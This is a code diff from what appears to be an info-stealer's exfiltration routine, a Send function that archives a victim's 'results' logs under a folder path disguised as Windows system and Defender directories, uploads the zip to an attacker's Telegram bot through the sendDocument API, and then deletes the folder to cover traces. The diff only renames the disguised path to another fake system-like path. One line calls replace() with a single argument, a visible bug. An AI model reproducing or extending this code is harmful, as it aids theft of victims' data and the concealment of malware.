@@ -19,7 +19,7 @@ def Send(userTOKEN,userCHAT_ID):
 		user = os.environ['USERPROFILE'].replace("C\\Users\\")
 	except:
 		user = 'The murk'
-	archiveOfLogs = rf'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\{user}-results.zip'
+	archiveOfLogs = rf'systemCache\cache_files\cache\files\system\admin\user\this\wsappx\dll\driver\host\winClient\tools\folder\sysDATA\{user}-results.zip'
 	userUrl = f'https://api.telegram.org/bot{userTOKEN}/sendDocument?chat_id={userCHAT_ID}'
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -34,6 +34,6 @@ def Send(userTOKEN,userCHAT_ID):
 	    print(e)
 
 	try:
-		shutil.rmtree('windows__cache__\\', ignore_errors=True)
+		shutil.rmtree('systemCache\\', ignore_errors=True)
 	except Exception as e:
 		print(e)
